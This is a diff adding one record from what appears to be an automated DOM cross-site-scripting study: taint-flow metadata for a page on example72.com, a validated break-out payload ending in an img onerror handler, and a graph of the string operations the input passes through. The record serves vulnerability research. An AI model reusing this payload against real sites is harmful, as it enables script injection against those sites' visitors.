@@ -1,0 +1,127 @@
+// Finding: a440dbb4-041b-4d47-a0df-88890ef24f4a
+// Finding.url: https://www.example72.com/resources/community-banking/##</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('5caf2e133b2549d2a67f526c30209cfb')><!--/*
+// Finding.parentloc: https://www.example72.com/resources/community-banking/##</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('5caf2e133b2549d2a67f526c30209cfb')><!--/*
+// Finding.domain: www.example72.com
+// Finding.base_domain: example72.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 2
+// Sanitizer.name: 
+// Sanitizer.location: https://www.example72.com/resources/community-banking/##</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('5caf2e133b2549d2a67f526c30209cfb')><!--/* - <anonymous>:1065:15
+// Finding.begin: 146
+// Finding.end: 147
+// Finding.original_uuid: e8c20b73-19ee-4e5b-8841-7b783616a3cc
+// Finding.TwentyFiveMillionFlowsId: 420132770
+// Finding.script: https://www.example72.com/assets/javascript/jquery-3.4.1.min.js
+// Finding.line: 2
+// Exploit.uuid: 5caf2e13-3b25-49d2-a67f-526c30209cfb
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: text
+// Exploit.content: C
+// Exploit.quote_type: None
+// Exploit.tag: None
+// Exploit.break_out: #</iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 15
+// Exploit.end_taint_url: 16
+// Exploit.replace_begin_url: 49
+// Exploit.replace_end_url: 49
+// Exploit.replace_begin_param: 182
+// Exploit.replace_end_param: 182
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: true
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 919389534
+// DepGraph.sanitizer_hash: -17460310
+// Removed LR concats 
+// Removed LR concats 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="str_replace_once"];
+n2 [shape=box, label="RegExp: /(\?.*)$/"];
+n3 [shape=box, label="Lit: "];
+n4 [shape=box, label="Var: x"];
+n5 [shape=ellipse, label="split"];
+n6 [shape=box, label="Lit: /"];
+n7 [shape=box, label="Var: x"];
+n8 [shape=ellipse, label="strtolower"];
+n9 [shape=box, label="Var: x"];
+n10 [shape=ellipse, label="char_at"];
+n11 [shape=box, label="Lit: 0"];
+n12 [shape=box, label="Var: x"];
+n13 [shape=ellipse, label="strtoupper"];
+n14 [shape=box, label="Var: x"];
+n15 [shape=ellipse, label="preg_replace"];
+n16 [shape=box, label="RegExp: /[-]/"];
+n17 [shape=box, label="Lit: "];
+n18 [shape=box, label="Var: x"];
+n19 [shape=ellipse, label="str_replace_once"];
+n20 [shape=box, label="RegExp: /\.(htm[l]?|asp[x]?|php|jsp)$/"];
+n21 [shape=box, label="Lit:  "];
+n22 [shape=box, label="Var: x"];
+n23 [shape=ellipse, label="str_replace_once"];
+n24 [shape=box, label="RegExp: /\.(htm[l]?|asp[x]?|php|jsp)$/"];
+n25 [shape=box, label="Lit:  "];
+n26 [shape=box, label="Var: x"];
+n27 [shape=ellipse, label="preg_replace"];
+n28 [shape=box, label="RegExp: /[-]/"];
+n29 [shape=box, label="Lit:  "];
+n30 [shape=box, label="Var: x"];
+n31 [shape=ellipse, label="."];
+n32 [shape=box, label="Lit: </a></li>"];
+n33 [shape=box, label="Var: x"];
+n34 [shape=doubleoctagon, label="Return: x"];
+n4 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n7 -> n1;
+n5 -> n6;
+n5 -> n7;
+n9 -> n5;
+n8 -> n9;
+n12 -> n8;
+n10 -> n11;
+n10 -> n12;
+n14 -> n10;
+n13 -> n14;
+n18 -> n13;
+n15 -> n16;
+n15 -> n17;
+n15 -> n18;
+n22 -> n15;
+n19 -> n20;
+n19 -> n21;
+n19 -> n22;
+n26 -> n19;
+n23 -> n24;
+n23 -> n25;
+n23 -> n26;
+n30 -> n23;
+n27 -> n28;
+n27 -> n29;
+n27 -> n30;
+n31 -> n27;
+n31 -> n32;
+n33 -> n31;
+n34 -> n33;
+}
